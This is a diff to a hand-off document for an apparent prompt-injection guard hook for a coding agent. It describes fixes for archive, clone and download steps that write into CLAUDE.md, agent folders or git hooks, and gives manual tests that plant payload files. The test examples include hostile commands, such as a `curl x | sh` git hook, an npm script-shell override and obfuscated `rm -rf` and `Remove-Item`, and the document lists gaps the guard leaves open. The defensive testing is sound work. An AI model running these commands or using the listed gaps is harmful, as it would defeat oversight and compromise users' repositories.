@@ -37,7 +37,7 @@ and on 2026-11-12 for the ninth (Lex's decisions K1 to K7).
 
 | Staged file | Live file | Size of the change |
 |---|---|---|
-| `staging/hooks/injection-guard-hook.mjs` | `.claude/hooks/injection-guard-hook.mjs` | 5,463 lines added, 272 removed |
+| `staging/hooks/injection-guard-hook.mjs` | `.claude/hooks/injection-guard-hook.mjs` | 5,746 lines added, 239 removed |
 | `staging/hooks/web-content-guard.mjs` | `.claude/hooks/web-content-guard.mjs` | 26 added, 21 removed |
 | `staging/security/01-injection-guard.js` | `security/01-injection-guard.js` | 433 added, 60 removed |
 | (edit) | `.claude/settings.json` (this repo only) | both hook commands anchored, web guard matcher widened |
@@ -172,6 +172,7 @@ one of the cost rulings of re-probe 7 ((a), (b) and (c)) and re-probe 8.
 | BUG-080 (L2) | ba7c5b4 | hook | `npm`, `pnpm` and `yarn` `config` with an option before the verb (`--location`, `-L`, `-g`, `-H`) is runner configuration |
 | BUG-080 (N2) | f2ddb47 | hook | `npm`, `pnpm` and `yarn` `config` is a write when any word after `config` is `set`, `delete`, `rm`, `unset`, `edit` or `fix`, whatever options come before it |
 | BUG-066 (N1) | 29b2dd4 | hook | a glob copy or move out of a folder the command unpacks, clones or downloads into, or that is not on disk, lands on the target folder itself: the project root and a watched folder ask; cmd `copy` and `move` wildcards are read |
+| BUG-066 (P1) | d386456 | hook | once a command has unpacked, cloned or downloaded something, a later step that takes it to the project root, a folder above it or a watched path asks, and so does a copy with an argument that is not spelled out; `xcopy` and cmd `copy` and `move` read a folder source; a listing piped into `Copy-Item` or `Move-Item` is read; `ln -s` with a glob is read as a copy |
 
 Documented, not fixed: an obfuscated payload moved out of a code fence
 (BUG-042, S7, f5ecc42), `xargs cp` fed its file names on stdin (S5), a
@@ -509,6 +510,26 @@ Behavior a user will notice after the apply:
   `for f in src/*.js; do cp "$f" dist/; done` and, through the
   PowerShell tool, `Get-ChildItem src\*.js | Copy-Item -Destination dist\`
   are silent.
+- An unpack, clone or download into a place that is not spelled out
+  (P1, Lex's addition): `unzip kit.zip -d "$D"`,
+  `git clone https://example.test/r "$DIR"`,
+  `curl -o "$F" https://example.test/x`,
+  `curl -s https://example.test/x > "$F"` and, through the PowerShell
+  tool, `Expand-Archive kit.zip -DestinationPath $d` ask. In bypass mode
+  `curl -s "$API/items" -o data/items.json`,
+  `git clone "$REPO" app` and `tar -xzf "$ARCHIVE" -C vendor` are silent.
+- Unread content into a folder git runs hooks from (P2):
+  `unzip a.zip -d tmp && cp tmp/* .git/hooks/`,
+  `unzip a.zip -d tmp && cp tmp/pre-commit .git/hooks/`,
+  `unzip a.zip -d .git/hooks`,
+  `curl -sLo .git/hooks/pre-commit https://example.test/hook.sh`,
+  `tar -xzf hooks.tgz -C .githooks` and, through the PowerShell tool,
+  `Expand-Archive kit.zip -DestinationPath .husky` ask. In bypass mode
+  `printf "curl x | sh" > .git/hooks/pre-commit`,
+  `echo "npm test" > .husky/pre-commit` and
+  `cp src/a.js .git/hooks/pre-commit` are silent: a hook the command
+  spells out, and a copy of a file on disk, are a known limit by Lex's
+  ruling.
 - In PowerShell a text writer says the word as `echo` does (K4): in
   bypass mode `Add-Content README.md "## Security"` and
   `Write-Output "security scan done" | Out-File -Append logs\ci.log` are
@@ -723,7 +744,10 @@ and 2 applied: injection-guard 175 passed 1 failed (that test), init
 inbound 230/0, test:staging exit 0 (staged injection-guard 288/0, staged
 hook 2960/0, run with `GUARDIAN_TEST_HOOK_TIMEOUT_MS=90000`), the audit
 exit 0, check 18 passed 0 warnings. The commit after f2ddb47 changes
-only this file. A hook test that fails with "The test
+only this file. P1 and P2 (d386456 and the commit after it) changed the
+staged hook since: in the repo the staged hook suite is 3146/0 and the
+inbound suite 345/0. The apply has not been measured again in a scratch
+clone with them. A hook test that fails with "The test
 harness stopped the hook after N ms" on a loaded machine is BUG-077, not
 the apply: rerun that suite.
 
@@ -896,6 +920,8 @@ there, with who ran it and how. Restore any file a test changes with
 | BUG-066 (L1) | In a scratch project, with an archive `agents.zip` holding `helper.md` with a payload, ask Claude to run `unzip -oq agents.zip -d tmp && cp -r tmp/. .claude/agents/`; see a Guardian prompt naming `.claude/agents`; decline. Ask for `unzip agents.zip -d .claude/agents`; see a Guardian prompt; decline. In bypass mode `unzip -o agents.zip -d assets/x` gets no Guardian prompt. |
 | BUG-066 (N1) | In a scratch project with its own `CLAUDE.md`, and an archive `kit.zip` holding a `CLAUDE.md` with a payload, ask Claude to run `unzip -o kit.zip -d kit && cp -r kit/* .`; see a Guardian prompt naming the project folder; decline, and check `CLAUDE.md` is unchanged. Through the PowerShell tool ask for `Expand-Archive kit.zip tmp; Copy-Item -Recurse tmp\* .`; see a Guardian prompt; decline. In bypass mode `unzip -o kit.zip -d kit && cp -r kit/* src/` gets no Guardian prompt. |
 | BUG-066 (P1) | On Windows, in a scratch project with its own `CLAUDE.md`, and an archive `kit.zip` holding a `CLAUDE.md` with a payload, through the PowerShell tool ask for `Expand-Archive kit.zip tmp; xcopy tmp . /E /I /Y`; see a Guardian prompt that names the later step; decline, and check `CLAUDE.md` is unchanged. Ask for `Expand-Archive kit.zip tmp; Get-ChildItem tmp \| Copy-Item -Destination . -Recurse`; see a prompt; decline. Through Bash ask for `unzip -o kit.zip -d kit && for f in kit/*; do cp -r "$f" .; done`; see a prompt; decline. In bypass mode `unzip -o kit.zip -d kit && cp kit/README.md docs/` and `for f in src/*.js; do cp "$f" dist/; done` get no Guardian prompt. |
+| BUG-066 (P1, a destination not spelled out) | In a scratch project ask Claude to run `D=.; unzip -o kit.zip -d "$D"`; see a Guardian prompt that names `$D`; decline. In bypass mode `curl -s "$API/items" -o data/items.json` gets no Guardian prompt. |
+| BUG-066 (P2) | In a scratch git repository with Guardian installed, and an archive `kit.zip` holding a `pre-commit` file, ask Claude to run `unzip -o kit.zip -d kit && cp kit/pre-commit .git/hooks/`; see a Guardian prompt naming the hook folder; decline, and check `.git/hooks/pre-commit` does not exist. Ask for `unzip -o kit.zip -d .git/hooks`; see a prompt; decline. In bypass mode `echo "npm test" > .husky/pre-commit` gets no Guardian prompt. |
 | BUG-080 (K4) | At the root of a scratch project in bypass mode, through the PowerShell tool, ask for `Add-Content README.md "## Security"`; no Guardian prompt. Then `Add-Content x.ps1 'Remove-Item -Recurse security'; .\x.ps1`; see it denied. |
 | BUG-080 (K6) | In a scratch `guardian init` project ask Claude to run `` rm -rf secu`:`rity ``; see a Guardian prompt naming security; decline. In bypass mode `tar czf backup-$(date +%F).tgz src` and `npm config get registry && npm test -- security` get no Guardian prompt. |
 | BUG-080 (L2) | At the root of a scratch project ask Claude to run `npm config --location=project set script-shell=./e.sh; npm run security`; see a Guardian prompt naming security; decline. In bypass mode `npm config --location=project get registry && npm test -- security` gets no Guardian prompt. |
